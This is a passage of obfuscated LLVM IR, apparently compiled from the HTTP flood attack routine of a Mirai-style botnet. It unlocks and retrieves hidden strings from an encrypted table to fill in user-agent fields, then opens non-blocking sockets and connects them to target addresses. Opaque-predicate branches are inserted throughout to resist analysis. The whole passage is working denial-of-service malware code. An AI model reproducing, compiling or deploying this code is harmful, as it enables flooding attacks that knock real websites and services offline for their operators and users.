  %391 = icmp eq i32 %390, 0
  %392 = icmp slt i32 %387, 10
  %393 = or i1 %391, %392
  br i1 %393, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %385
  %394 = call i32 @rand_next()
  %395 = urem i32 %394, 15
  %396 = load i32, i32* @x.19
  %397 = load i32, i32* @y.20
  %398 = sub i32 %396, 1
  %399 = mul i32 %396, %398
  %400 = urem i32 %399, 2
  %401 = icmp eq i32 %400, 0
  %402 = icmp slt i32 %397, 10
  %403 = or i1 %401, %402
  br i1 %403, label %originalBBpart238, label %originalBB29alteredBB

originalBBpart238:                                ; preds = %originalBB29
  switch i32 %395, label %571 [
    i32 0, label %404
    i32 1, label %413
    i32 2, label %422
    i32 3, label %447
    i32 4, label %472
    i32 5, label %481
    i32 6, label %490
    i32 7, label %499
    i32 8, label %508
    i32 9, label %517
    i32 10, label %526
    i32 11, label %535
    i32 12, label %544
    i32 13, label %553
    i32 14, label %562
  ]

; <label>:404:                                    ; preds = %originalBBpart238
  call void @table_unlock_val(i8 zeroext 47)
  %405 = load %struct.attack_http_state*, %struct.attack_http_state** %21, align 8
  %406 = load i32, i32* %17, align 4
  %407 = sext i32 %406 to i64
  %408 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %405, i64 %407
  %409 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %408, i32 0, i32 5
  %410 = getelementptr inbounds [512 x i8], [512 x i8]* %409, i32 0, i32 0
  %411 = call i8* @table_retrieve_val(i32 47, i32* null)
  %412 = call i32 @util_strcpy(i8* %410, i8* %411)
  call void @table_lock_val(i8 zeroext 47)
  br label %571

; <label>:413:                                    ; preds = %originalBBpart238
  call void @table_unlock_val(i8 zeroext 48)
  %414 = load %struct.attack_http_state*, %struct.attack_http_state** %21, align 8
  %415 = load i32, i32* %17, align 4
  %416 = sext i32 %415 to i64
  %417 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %414, i64 %416
  %418 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %417, i32 0, i32 5
  %419 = getelementptr inbounds [512 x i8], [512 x i8]* %418, i32 0, i32 0
  %420 = call i8* @table_retrieve_val(i32 48, i32* null)
  %421 = call i32 @util_strcpy(i8* %419, i8* %420)
  call void @table_lock_val(i8 zeroext 48)
  br label %571

; <label>:422:                                    ; preds = %originalBBpart238
  %423 = load i32, i32* @x.19
  %424 = load i32, i32* @y.20
  %425 = sub i32 %423, 1
  %426 = mul i32 %423, %425
  %427 = urem i32 %426, 2
  %428 = icmp eq i32 %427, 0
  %429 = icmp slt i32 %424, 10
  %430 = or i1 %428, %429
  br i1 %430, label %originalBB40, label %originalBB40alteredBB

originalBB40:                                     ; preds = %originalBB40alteredBB, %422
  call void @table_unlock_val(i8 zeroext 49)
  %431 = load %struct.attack_http_state*, %struct.attack_http_state** %21, align 8
  %432 = load i32, i32* %17, align 4
  %433 = sext i32 %432 to i64
  %434 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %431, i64 %433
  %435 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %434, i32 0, i32 5
  %436 = getelementptr inbounds [512 x i8], [512 x i8]* %435, i32 0, i32 0
  %437 = call i8* @table_retrieve_val(i32 49, i32* null)
  %438 = call i32 @util_strcpy(i8* %436, i8* %437)
  call void @table_lock_val(i8 zeroext 49)
  %439 = load i32, i32* @x.19
  %440 = load i32, i32* @y.20
  %441 = sub i32 %439, 1
  %442 = mul i32 %439, %441
  %443 = urem i32 %442, 2
  %444 = icmp eq i32 %443, 0
  %445 = icmp slt i32 %440, 10
  %446 = or i1 %444, %445
  br i1 %446, label %originalBBpart242, label %originalBB40alteredBB

originalBBpart242:                                ; preds = %originalBB40
  br label %571

; <label>:447:                                    ; preds = %originalBBpart238
  %448 = load i32, i32* @x.19
  %449 = load i32, i32* @y.20
  %450 = sub i32 %448, 1
  %451 = mul i32 %448, %450
  %452 = urem i32 %451, 2
  %453 = icmp eq i32 %452, 0
  %454 = icmp slt i32 %449, 10
  %455 = or i1 %453, %454
  br i1 %455, label %originalBB44, label %originalBB44alteredBB

originalBB44:                                     ; preds = %originalBB44alteredBB, %447
  call void @table_unlock_val(i8 zeroext 50)
  %456 = load %struct.attack_http_state*, %struct.attack_http_state** %21, align 8
  %457 = load i32, i32* %17, align 4
  %458 = sext i32 %457 to i64
  %459 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %456, i64 %458
  %460 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %459, i32 0, i32 5
  %461 = getelementptr inbounds [512 x i8], [512 x i8]* %460, i32 0, i32 0
  %462 = call i8* @table_retrieve_val(i32 50, i32* null)
  %463 = call i32 @util_strcpy(i8* %461, i8* %462)
  call void @table_lock_val(i8 zeroext 50)
  %464 = load i32, i32* @x.19
  %465 = load i32, i32* @y.20
  %466 = sub i32 %464, 1
  %467 = mul i32 %464, %466
  %468 = urem i32 %467, 2
  %469 = icmp eq i32 %468, 0
  %470 = icmp slt i32 %465, 10
  %471 = or i1 %469, %470
  br i1 %471, label %originalBBpart246, label %originalBB44alteredBB

originalBBpart246:                                ; preds = %originalBB44
  br label %571

; <label>:472:                                    ; preds = %originalBBpart238
  call void @table_unlock_val(i8 zeroext 51)
  %473 = load %struct.attack_http_state*, %struct.attack_http_state** %21, align 8
  %474 = load i32, i32* %17, align 4
  %475 = sext i32 %474 to i64
  %476 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %473, i64 %475
  %477 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %476, i32 0, i32 5
  %478 = getelementptr inbounds [512 x i8], [512 x i8]* %477, i32 0, i32 0
  %479 = call i8* @table_retrieve_val(i32 51, i32* null)
  %480 = call i32 @util_strcpy(i8* %478, i8* %479)
  call void @table_lock_val(i8 zeroext 51)
  br label %571

; <label>:481:                                    ; preds = %originalBBpart238
  call void @table_unlock_val(i8 zeroext 52)
  %482 = load %struct.attack_http_state*, %struct.attack_http_state** %21, align 8
  %483 = load i32, i32* %17, align 4
  %484 = sext i32 %483 to i64
  %485 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %482, i64 %484
  %486 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %485, i32 0, i32 5
  %487 = getelementptr inbounds [512 x i8], [512 x i8]* %486, i32 0, i32 0
  %488 = call i8* @table_retrieve_val(i32 52, i32* null)
  %489 = call i32 @util_strcpy(i8* %487, i8* %488)
  call void @table_lock_val(i8 zeroext 52)
  br label %571

; <label>:490:                                    ; preds = %originalBBpart238
  call void @table_unlock_val(i8 zeroext 53)
  %491 = load %struct.attack_http_state*, %struct.attack_http_state** %21, align 8
  %492 = load i32, i32* %17, align 4
  %493 = sext i32 %492 to i64
  %494 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %491, i64 %493
  %495 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %494, i32 0, i32 5
  %496 = getelementptr inbounds [512 x i8], [512 x i8]* %495, i32 0, i32 0
  %497 = call i8* @table_retrieve_val(i32 53, i32* null)
  %498 = call i32 @util_strcpy(i8* %496, i8* %497)
  call void @table_lock_val(i8 zeroext 53)
  br label %571

; <label>:499:                                    ; preds = %originalBBpart238
  call void @table_unlock_val(i8 zeroext 54)
  %500 = load %struct.attack_http_state*, %struct.attack_http_state** %21, align 8
  %501 = load i32, i32* %17, align 4
  %502 = sext i32 %501 to i64
  %503 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %500, i64 %502
  %504 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %503, i32 0, i32 5
  %505 = getelementptr inbounds [512 x i8], [512 x i8]* %504, i32 0, i32 0
  %506 = call i8* @table_retrieve_val(i32 54, i32* null)
  %507 = call i32 @util_strcpy(i8* %505, i8* %506)
  call void @table_lock_val(i8 zeroext 54)
  br label %571

; <label>:508:                                    ; preds = %originalBBpart238
  call void @table_unlock_val(i8 zeroext 55)
  %509 = load %struct.attack_http_state*, %struct.attack_http_state** %21, align 8
  %510 = load i32, i32* %17, align 4
  %511 = sext i32 %510 to i64
  %512 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %509, i64 %511
  %513 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %512, i32 0, i32 5
  %514 = getelementptr inbounds [512 x i8], [512 x i8]* %513, i32 0, i32 0
  %515 = call i8* @table_retrieve_val(i32 55, i32* null)
  %516 = call i32 @util_strcpy(i8* %514, i8* %515)
  call void @table_lock_val(i8 zeroext 55)
  br label %571

; <label>:517:                                    ; preds = %originalBBpart238
  call void @table_unlock_val(i8 zeroext 56)
  %518 = load %struct.attack_http_state*, %struct.attack_http_state** %21, align 8
  %519 = load i32, i32* %17, align 4
  %520 = sext i32 %519 to i64
  %521 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %518, i64 %520
  %522 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %521, i32 0, i32 5
  %523 = getelementptr inbounds [512 x i8], [512 x i8]* %522, i32 0, i32 0
  %524 = call i8* @table_retrieve_val(i32 56, i32* null)
  %525 = call i32 @util_strcpy(i8* %523, i8* %524)
  call void @table_lock_val(i8 zeroext 56)
  br label %571

; <label>:526:                                    ; preds = %originalBBpart238
  call void @table_unlock_val(i8 zeroext 57)
  %527 = load %struct.attack_http_state*, %struct.attack_http_state** %21, align 8
  %528 = load i32, i32* %17, align 4
  %529 = sext i32 %528 to i64
  %530 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %527, i64 %529
  %531 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %530, i32 0, i32 5
  %532 = getelementptr inbounds [512 x i8], [512 x i8]* %531, i32 0, i32 0
  %533 = call i8* @table_retrieve_val(i32 57, i32* null)
  %534 = call i32 @util_strcpy(i8* %532, i8* %533)
  call void @table_lock_val(i8 zeroext 57)
  br label %571

; <label>:535:                                    ; preds = %originalBBpart238
  call void @table_unlock_val(i8 zeroext 58)
  %536 = load %struct.attack_http_state*, %struct.attack_http_state** %21, align 8
  %537 = load i32, i32* %17, align 4
  %538 = sext i32 %537 to i64
  %539 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %536, i64 %538
  %540 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %539, i32 0, i32 5
  %541 = getelementptr inbounds [512 x i8], [512 x i8]* %540, i32 0, i32 0
  %542 = call i8* @table_retrieve_val(i32 58, i32* null)
  %543 = call i32 @util_strcpy(i8* %541, i8* %542)
  call void @table_lock_val(i8 zeroext 58)
  br label %571

; <label>:544:                                    ; preds = %originalBBpart238
  call void @table_unlock_val(i8 zeroext 59)
  %545 = load %struct.attack_http_state*, %struct.attack_http_state** %21, align 8
  %546 = load i32, i32* %17, align 4
  %547 = sext i32 %546 to i64
  %548 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %545, i64 %547
  %549 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %548, i32 0, i32 5
  %550 = getelementptr inbounds [512 x i8], [512 x i8]* %549, i32 0, i32 0
  %551 = call i8* @table_retrieve_val(i32 59, i32* null)
  %552 = call i32 @util_strcpy(i8* %550, i8* %551)
  call void @table_lock_val(i8 zeroext 59)
  br label %571

; <label>:553:                                    ; preds = %originalBBpart238
  call void @table_unlock_val(i8 zeroext 60)
  %554 = load %struct.attack_http_state*, %struct.attack_http_state** %21, align 8
  %555 = load i32, i32* %17, align 4
  %556 = sext i32 %555 to i64
  %557 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %554, i64 %556
  %558 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %557, i32 0, i32 5
  %559 = getelementptr inbounds [512 x i8], [512 x i8]* %558, i32 0, i32 0
  %560 = call i8* @table_retrieve_val(i32 60, i32* null)
  %561 = call i32 @util_strcpy(i8* %559, i8* %560)
  call void @table_lock_val(i8 zeroext 60)
  br label %571

; <label>:562:                                    ; preds = %originalBBpart238
  call void @table_unlock_val(i8 zeroext 61)
  %563 = load %struct.attack_http_state*, %struct.attack_http_state** %21, align 8
  %564 = load i32, i32* %17, align 4
  %565 = sext i32 %564 to i64
  %566 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %563, i64 %565
  %567 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %566, i32 0, i32 5
  %568 = getelementptr inbounds [512 x i8], [512 x i8]* %567, i32 0, i32 0
  %569 = call i8* @table_retrieve_val(i32 61, i32* null)
  %570 = call i32 @util_strcpy(i8* %568, i8* %569)
  call void @table_lock_val(i8 zeroext 61)
  br label %571

; <label>:571:                                    ; preds = %562, %553, %544, %535, %526, %517, %508, %499, %490, %481, %472, %originalBBpart246, %originalBBpart242, %413, %404, %originalBBpart238
  %572 = load %struct.attack_http_state*, %struct.attack_http_state** %21, align 8
  %573 = load i32, i32* %17, align 4
  %574 = sext i32 %573 to i64
  %575 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %572, i64 %574
  %576 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %575, i32 0, i32 6
  %577 = getelementptr inbounds [257 x i8], [257 x i8]* %576, i32 0, i32 0
  %578 = load i8*, i8** %25, align 8
  %579 = call i32 @util_strcpy(i8* %577, i8* %578)
  br label %580

; <label>:580:                                    ; preds = %571
  %581 = load i32, i32* @x.19
  %582 = load i32, i32* @y.20
  %583 = sub i32 %581, 1
  %584 = mul i32 %581, %583
  %585 = urem i32 %584, 2
  %586 = icmp eq i32 %585, 0
  %587 = icmp slt i32 %582, 10
  %588 = or i1 %586, %587
  br i1 %588, label %originalBB48, label %originalBB48alteredBB

originalBB48:                                     ; preds = %originalBB48alteredBB, %580
  %589 = load i32, i32* %17, align 4
  %590 = add nsw i32 %589, 1
  store i32 %590, i32* %17, align 4
  %591 = load i32, i32* @x.19
  %592 = load i32, i32* @y.20
  %593 = sub i32 %591, 1
  %594 = mul i32 %591, %593
  %595 = urem i32 %594, 2
  %596 = icmp eq i32 %595, 0
  %597 = icmp slt i32 %592, 10
  %598 = or i1 %596, %597
  br i1 %598, label %originalBBpart252, label %originalBB48alteredBB

originalBBpart252:                                ; preds = %originalBB48
  br label %229

; <label>:599:                                    ; preds = %229
  br label %600

; <label>:600:                                    ; preds = %4294, %originalBBpart2203, %1552, %599
  store i32 0, i32* %31, align 4
  %601 = call i64 @time(i64* null) #6
  %602 = trunc i64 %601 to i32
  store i32 %602, i32* %35, align 4
  br label %603

; <label>:603:                                    ; preds = %600
  %604 = load i32, i32* @x.19
  %605 = load i32, i32* @y.20
  %606 = sub i32 %604, 1
  %607 = mul i32 %604, %606
  %608 = urem i32 %607, 2
  %609 = icmp eq i32 %608, 0
  %610 = icmp slt i32 %605, 10
  %611 = or i1 %609, %610
  br i1 %611, label %originalBB54, label %originalBB54alteredBB

originalBB54:                                     ; preds = %originalBB54alteredBB, %603
  %612 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %29, i32 0, i32 0
  %613 = getelementptr inbounds [16 x i64], [16 x i64]* %612, i64 0, i64 0
  %614 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %613) #6, !srcloc !1
  %615 = extractvalue { i64, i64* } %614, 0
  %616 = extractvalue { i64, i64* } %614, 1
  %617 = trunc i64 %615 to i32
  store i32 %617, i32* %36, align 4
  %618 = ptrtoint i64* %616 to i64
  %619 = trunc i64 %618 to i32
  store i32 %619, i32* %37, align 4
  %620 = load i32, i32* @x.19
  %621 = load i32, i32* @y.20
  %622 = sub i32 %620, 1
  %623 = mul i32 %620, %622
  %624 = urem i32 %623, 2
  %625 = icmp eq i32 %624, 0
  %626 = icmp slt i32 %621, 10
  %627 = or i1 %625, %626
  br i1 %627, label %originalBBpart256, label %originalBB54alteredBB

originalBBpart256:                                ; preds = %originalBB54
  br label %628

; <label>:628:                                    ; preds = %originalBBpart256
  br label %629

; <label>:629:                                    ; preds = %628
  %630 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %30, i32 0, i32 0
  %631 = getelementptr inbounds [16 x i64], [16 x i64]* %630, i64 0, i64 0
  %632 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %631) #6, !srcloc !2
  %633 = extractvalue { i64, i64* } %632, 0
  %634 = extractvalue { i64, i64* } %632, 1
  %635 = trunc i64 %633 to i32
  store i32 %635, i32* %38, align 4
  %636 = ptrtoint i64* %634 to i64
  %637 = trunc i64 %636 to i32
  store i32 %637, i32* %39, align 4
  br label %638

; <label>:638:                                    ; preds = %629
  store i32 0, i32* %17, align 4
  br label %639

; <label>:639:                                    ; preds = %1546, %638
  %640 = load i32, i32* %17, align 4
  %641 = load i32, i32* %26, align 4
  %642 = icmp slt i32 %640, %641
  br i1 %642, label %643, label %1549

; <label>:643:                                    ; preds = %639
  %644 = load %struct.attack_http_state*, %struct.attack_http_state** %21, align 8
  %645 = load i32, i32* %17, align 4
  %646 = sext i32 %645 to i64
  %647 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %644, i64 %646
  store %struct.attack_http_state* %647, %struct.attack_http_state** %34, align 8
  %648 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %649 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %648, i32 0, i32 1
  %650 = load i8, i8* %649, align 4
  %651 = zext i8 %650 to i32
  %652 = icmp eq i32 %651, 1
  br i1 %652, label %653, label %697

; <label>:653:                                    ; preds = %643
  %654 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %655 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %654, i32 0, i32 12
  %656 = load i32, i32* %655, align 4
  %657 = icmp ne i32 %656, 0
  br i1 %657, label %658, label %677

; <label>:658:                                    ; preds = %653
  %659 = load i32, i32* @x.19
  %660 = load i32, i32* @y.20
  %661 = sub i32 %659, 1
  %662 = mul i32 %659, %661
  %663 = urem i32 %662, 2
  %664 = icmp eq i32 %663, 0
  %665 = icmp slt i32 %660, 10
  %666 = or i1 %664, %665
  br i1 %666, label %originalBB58, label %originalBB58alteredBB

originalBB58:                                     ; preds = %originalBB58alteredBB, %658
  %667 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %668 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %667, i32 0, i32 1
  store i8 4, i8* %668, align 4
  %669 = load i32, i32* @x.19
  %670 = load i32, i32* @y.20
  %671 = sub i32 %669, 1
  %672 = mul i32 %669, %671
  %673 = urem i32 %672, 2
  %674 = icmp eq i32 %673, 0
  %675 = icmp slt i32 %670, 10
  %676 = or i1 %674, %675
  br i1 %676, label %originalBBpart260, label %originalBB58alteredBB

originalBBpart260:                                ; preds = %originalBB58
  br label %680

; <label>:677:                                    ; preds = %653
  %678 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %679 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %678, i32 0, i32 1
  store i8 0, i8* %679, align 4
  br label %680

; <label>:680:                                    ; preds = %677, %originalBBpart260
  %681 = load i32, i32* @x.19
  %682 = load i32, i32* @y.20
  %683 = sub i32 %681, 1
  %684 = mul i32 %681, %683
  %685 = urem i32 %684, 2
  %686 = icmp eq i32 %685, 0
  %687 = icmp slt i32 %682, 10
  %688 = or i1 %686, %687
  br i1 %688, label %originalBB62, label %originalBB62alteredBB

originalBB62:                                     ; preds = %originalBB62alteredBB, %680
  %689 = load i32, i32* @x.19
  %690 = load i32, i32* @y.20
  %691 = sub i32 %689, 1
  %692 = mul i32 %689, %691
  %693 = urem i32 %692, 2
  %694 = icmp eq i32 %693, 0
  %695 = icmp slt i32 %690, 10
  %696 = or i1 %694, %695
  br i1 %696, label %originalBBpart264, label %originalBB62alteredBB

originalBBpart264:                                ; preds = %originalBB62
  br label %697

; <label>:697:                                    ; preds = %originalBBpart264, %643
  %698 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %699 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %698, i32 0, i32 1
  %700 = load i8, i8* %699, align 4
  %701 = zext i8 %700 to i32
  %702 = icmp eq i32 %701, 0
  br i1 %702, label %703, label %815

; <label>:703:                                    ; preds = %697
  %704 = load i32, i32* @x.19
  %705 = load i32, i32* @y.20
  %706 = sub i32 %704, 1
  %707 = mul i32 %704, %706
  %708 = urem i32 %707, 2
  %709 = icmp eq i32 %708, 0
  %710 = icmp slt i32 %705, 10
  %711 = or i1 %709, %710
  br i1 %711, label %originalBB66, label %originalBB66alteredBB

originalBB66:                                     ; preds = %originalBB66alteredBB, %703
  %712 = bitcast %struct.sockaddr_in* %40 to i8*
  call void @llvm.memset.p0i8.i64(i8* %712, i8 0, i64 16, i32 4, i1 false)
  %713 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %714 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %713, i32 0, i32 0
  %715 = load i32, i32* %714, align 4
  %716 = icmp ne i32 %715, -1
  %717 = load i32, i32* @x.19
  %718 = load i32, i32* @y.20
  %719 = sub i32 %717, 1
  %720 = mul i32 %717, %719
  %721 = urem i32 %720, 2
  %722 = icmp eq i32 %721, 0
  %723 = icmp slt i32 %718, 10
  %724 = or i1 %722, %723
  br i1 %724, label %originalBBpart268, label %originalBB66alteredBB

originalBBpart268:                                ; preds = %originalBB66
  br i1 %716, label %725, label %746

; <label>:725:                                    ; preds = %originalBBpart268
  %726 = load i32, i32* @x.19
  %727 = load i32, i32* @y.20
  %728 = sub i32 %726, 1
  %729 = mul i32 %726, %728
  %730 = urem i32 %729, 2
  %731 = icmp eq i32 %730, 0
  %732 = icmp slt i32 %727, 10
  %733 = or i1 %731, %732
  br i1 %733, label %originalBB70, label %originalBB70alteredBB

originalBB70:                                     ; preds = %originalBB70alteredBB, %725
  %734 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %735 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %734, i32 0, i32 0
  %736 = load i32, i32* %735, align 4
  %737 = call i32 @close(i32 %736)
  %738 = load i32, i32* @x.19
  %739 = load i32, i32* @y.20
  %740 = sub i32 %738, 1
  %741 = mul i32 %738, %740
  %742 = urem i32 %741, 2
  %743 = icmp eq i32 %742, 0
  %744 = icmp slt i32 %739, 10
  %745 = or i1 %743, %744
  br i1 %745, label %originalBBpart272, label %originalBB70alteredBB

originalBBpart272:                                ; preds = %originalBB70
  br label %746

; <label>:746:                                    ; preds = %originalBBpart272, %originalBBpart268
  %747 = call i32 @socket(i32 2, i32 1, i32 0) #6
  %748 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %749 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %748, i32 0, i32 0
  store i32 %747, i32* %749, align 4
  %750 = icmp eq i32 %747, -1
  br i1 %750, label %751, label %752

; <label>:751:                                    ; preds = %746
  br label %1546

; <label>:752:                                    ; preds = %746
  %753 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %754 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %753, i32 0, i32 0
  %755 = load i32, i32* %754, align 4
  %756 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %757 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %756, i32 0, i32 0
  %758 = load i32, i32* %757, align 4
  %759 = call i32 (i32, i32, ...) @fcntl(i32 %758, i32 3, i32 0)
  %760 = or i32 2048, %759
  %761 = call i32 (i32, i32, ...) @fcntl(i32 %755, i32 4, i32 %760)
  store i32 65535, i32* %18, align 4
  %762 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %763 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %762, i32 0, i32 0
  %764 = load i32, i32* %763, align 4
  %765 = bitcast i32* %18 to i8*
  %766 = call i32 @setsockopt(i32 %764, i32 0, i32 8, i8* %765, i32 4) #6
  %767 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %40, i32 0, i32 0
  store i16 2, i16* %767, align 4
  %768 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %769 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %768, i32 0, i32 4
  %770 = load i32, i32* %769, align 4
  %771 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %40, i32 0, i32 2
  %772 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %771, i32 0, i32 0
  store i32 %770, i32* %772, align 4
  %773 = load i16, i16* %27, align 2
  %774 = call zeroext i16 @htons(i16 zeroext %773) #7
  %775 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %40, i32 0, i32 1
  store i16 %774, i16* %775, align 2
  %776 = load i32, i32* %35, align 4
  %777 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %778 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %777, i32 0, i32 2
  store i32 %776, i32* %778, align 4
  %779 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %780 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %779, i32 0, i32 1
  store i8 2, i8* %780, align 4
  %781 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %782 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %781, i32 0, i32 0
  %783 = load i32, i32* %782, align 4
  %784 = bitcast %union.__CONST_SOCKADDR_ARG* %41 to %struct.sockaddr**
  %785 = bitcast %struct.sockaddr_in* %40 to %struct.sockaddr*
  store %struct.sockaddr* %785, %struct.sockaddr** %784, align 8
  %786 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %41, i32 0, i32 0
  %787 = load %struct.sockaddr*, %struct.sockaddr** %786, align 8
  %788 = call i32 @connect(i32 %783, %struct.sockaddr* %787, i32 16)
  %789 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %790 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %789, i32 0, i32 0
  %791 = load i32, i32* %790, align 4
  %792 = srem i32 %791, 64
  %793 = zext i32 %792 to i64
  %794 = shl i64 1, %793
  %795 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %30, i32 0, i32 0
  %796 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %797 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %796, i32 0, i32 0
  %798 = load i32, i32* %797, align 4
  %799 = sdiv i32 %798, 64
  %800 = sext i32 %799 to i64
  %801 = getelementptr inbounds [16 x i64], [16 x i64]* %795, i64 0, i64 %800
  %802 = load i64, i64* %801, align 8
  %803 = or i64 %802, %794
  store i64 %803, i64* %801, align 8
  %804 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %805 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %804, i32 0, i32 0
  %806 = load i32, i32* %805, align 4
  %807 = load i32, i32* %31, align 4
  %808 = icmp sgt i32 %806, %807
  br i1 %808, label %809, label %814

; <label>:809:                                    ; preds = %752
  %810 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %811 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %810, i32 0, i32 0
  %812 = load i32, i32* %811, align 4
  %813 = add nsw i32 %812, 1
  store i32 %813, i32* %31, align 4
  br label %814

; <label>:814:                                    ; preds = %809, %752
  br label %1545

; <label>:815:                                    ; preds = %697
  %816 = load i32, i32* @x.19
  %817 = load i32, i32* @y.20
  %818 = sub i32 %816, 1
  %819 = mul i32 %816, %818
  %820 = urem i32 %819, 2
  %821 = icmp eq i32 %820, 0
  %822 = icmp slt i32 %817, 10
  %823 = or i1 %821, %822
  br i1 %823, label %originalBB74, label %originalBB74alteredBB

originalBB74:                                     ; preds = %originalBB74alteredBB, %815
  %824 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %825 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %824, i32 0, i32 1
  %826 = load i8, i8* %825, align 4
  %827 = zext i8 %826 to i32
  %828 = icmp eq i32 %827, 2
  %829 = load i32, i32* @x.19
  %830 = load i32, i32* @y.20
  %831 = sub i32 %829, 1
  %832 = mul i32 %829, %831
  %833 = urem i32 %832, 2
  %834 = icmp eq i32 %833, 0
  %835 = icmp slt i32 %830, 10
  %836 = or i1 %834, %835
  br i1 %836, label %originalBBpart276, label %originalBB74alteredBB

originalBBpart276:                                ; preds = %originalBB74
  br i1 %828, label %837, label %896

; <label>:837:                                    ; preds = %originalBBpart276
  %838 = load i32, i32* %35, align 4
  %839 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %840 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %839, i32 0, i32 2
  %841 = load i32, i32* %840, align 4
  %842 = sub i32 %838, %841
  %843 = icmp ugt i32 %842, 30
  br i1 %843, label %844, label %853

; <label>:844:                                    ; preds = %837
  %845 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %846 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %845, i32 0, i32 1
  store i8 0, i8* %846, align 4
  %847 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %848 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %847, i32 0, i32 0
  %849 = load i32, i32* %848, align 4
  %850 = call i32 @close(i32 %849)
